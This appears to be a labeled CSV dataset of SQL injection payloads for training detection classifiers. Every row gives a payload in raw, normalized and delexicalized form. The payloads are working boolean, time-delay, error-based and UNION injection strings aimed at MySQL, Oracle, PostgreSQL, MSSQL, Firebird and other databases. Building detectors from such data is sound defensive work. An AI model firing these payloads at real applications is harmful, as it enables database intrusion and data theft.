payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj","1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and 'hqqj' = 'hqqj",<NUM><STR>hqqj<STR>hqqj,1,False,,sqli_dataset
-6079   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  8708  =  8708,-6079 ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 8708 = 8708,-<NUM> ) ) ) or <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) and ( ( ( <NUM> = <NUM>,1,False,,sqli_dataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual","select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual",1,False,,sqli_dataset
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'oxvd' like 'oxvd","1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'oxvd' like 'oxvd",<NUM><STR>oxvd<STR>oxvd,1,False,,sqli_dataset
"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--","-2899"" ) ) as uyoc where 8417 = 8417 union all select 8417,8417,8417,8417--","-<NUM>"" ) ) as uyoc where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #","<NUM><STR>alxi' where <NUM> = <NUM> and <NUM> = benchmark ( <NUM>,md5 ( 0x6d457153 ) ) #",1,True,,sqli_dataset
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,-<NUM> ) ) as gvfo where <NUM> = <NUM> or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) --,1,False,,sqli_dataset
-2929'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'nzmk'  =  'nzmk,-2929' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'nzmk' = 'nzmk,-<NUM><STR>qqpjq<STR>qzvzq<STR>nzmk<STR>nzmk,1,False,,sqli_dataset
"1""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>"" ) and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
"-5014%""   )    )     )   or 3348  =  2430--","-5014%"" ) ) ) or 3348 = 2430--","-<NUM>%"" ) ) ) or <NUM> = <NUM>--",1,False,,sqli_dataset
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#","1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#","<NUM>' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'trdf' like 'trdf","1' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'trdf' like 'trdf",<NUM><STR>trdf<STR>trdf,1,True,,sqli_dataset
"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336","1 ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( 5336 = 5336","<NUM> ) ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( <NUM> = <NUM>",1,False,,sqli_dataset
1'  )   as ibaw where 2130  =  2130 and 9198  =  9198--,1' ) as ibaw where 2130 = 2130 and 9198 = 9198--,<NUM>' ) as ibaw where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw","1 or elt ( 6272 = 6272,sleep ( 5 ) ) # klaw","<NUM> or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) # klaw",1,False,,sqli_dataset
"1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM><STR>dpje' where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'","1'+ ( select 'nhlx' where 2291 = 2291 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",<NUM><STR>nhlx<STR>,1,True,,sqli_dataset
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,select ( case when ( 7594 = 8086 ) then 7594 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --,1,False,,sqli_dataset
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )","1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )","<NUM>' ( select ( case when ( <NUM> = <NUM> ) then regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) else char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) end ) from ( values ( <NUM> ) ) )",1,False,,sqli_dataset
"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","-7543' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM>' ) ) ) or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #",1,True,,sqli_dataset
"1%"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""%""  =  ""","1%"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --","1%"" ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --","<NUM>%"" ) ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"1'||  (  select 'tkmc' from dual where 9675  =  9675 union all select null,null,null,null--","1'|| ( select 'tkmc' from dual where 9675 = 9675 union all select null,null,null,null--","<NUM><STR>tkmc' from dual where <NUM> = <NUM> union all select null,null,null,null--",1,False,,sqli_dataset
"1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1 where 6044 = 6044 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","<NUM> where <NUM> = <NUM> or ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) ) --",1,True,,sqli_dataset
1'||  (  select 'fven' where 1433  =  1433 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',1'|| ( select 'fven' where 1433 = 1433 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',<NUM><STR>fven<STR>qqpjq<STR>qzvzq<STR>,1,False,,sqli_dataset
"1""  )   where 6809  =  6809 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --","1"" ) where 6809 = 6809 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --","<NUM>"" ) where <NUM> = <NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) sgvo ) --",1,False,,sqli_dataset
1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,1' ) ) ) and 1743 = 6793 and ( ( ( 'rgcv' = 'rgcv,<NUM><STR>rgcv<STR>rgcv,1,False,,sqli_dataset
1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1 ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 1260 = 1260,<NUM> ) ) and <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) and ( ( <NUM> = <NUM>,1,False,,sqli_dataset
1'+  (  select 'mjgo' where 4026  =  4026,1'+ ( select 'mjgo' where 4026 = 4026,<NUM><STR>mjgo' where <NUM> = <NUM>,1,True,,sqli_dataset
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1 ) where 1090 = 1090 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,<NUM> ) where <NUM> = <NUM> and <NUM> = ( <STR>|| ( select case <NUM> when <NUM> then <NUM> else <NUM> end from rdb$database ) ||<STR> ) --,1,False,,sqli_dataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz","select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""psbz"" = ""psbz","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual and <STR> = ""psbz",1,False,,sqli_dataset
"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%""  =  ""","1%"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1' ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>' ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',1%' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( '%' = ',<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"iif  (  8213  =  4718,1,1/0  )","iif ( 8213 = 4718,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"(  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )","( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )","( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,False,,sqli_dataset
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa","1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'bmsa' = 'bmsa",<NUM><STR>bmsa<STR>bmsa,1,False,,sqli_dataset
"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '","1%' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '","1%' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",<NUM>%<STR>abcdefg<STR>%<STR>,1,False,,sqli_dataset
1' and 7533  =  7533,1' and 7533 = 7533,<NUM>' and <NUM> = <NUM>,1,False,,sqli_dataset
-4775'  )   or 3038  =  3038,-4775' ) or 3038 = 3038,-<NUM>' ) or <NUM> = <NUM>,1,False,,sqli_dataset
"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#","-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#","-<NUM><STR>vloa' from dual where <NUM> = <NUM> union all select <NUM>,<NUM>#",1,False,,sqli_dataset
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,-<NUM> ) where <NUM> = <NUM> or <NUM> = cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) --,1,False,,sqli_dataset
-6327'   )    )    union all select 2685--,-6327' ) ) union all select 2685--,-<NUM>' ) ) union all select <NUM>--,1,False,,sqli_dataset
"1 where 7642  =  7642 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --","<NUM> where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,False,,sqli_dataset
"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  ""","1%"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1 ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM> ) ) ) and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
1'  )   as epgz where 2898  =  2898 and 7028  =  2287#,1' ) as epgz where 2898 = 2898 and 7028 = 2287#,<NUM>' ) as epgz where <NUM> = <NUM> and <NUM> = <NUM>#,1,False,,sqli_dataset
"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  ""","1%"" ) ) and sleep ( 5 ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'xpks' like 'xpks","1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'xpks' like 'xpks",<NUM><STR>xpks<STR>xpks,1,True,,sqli_dataset
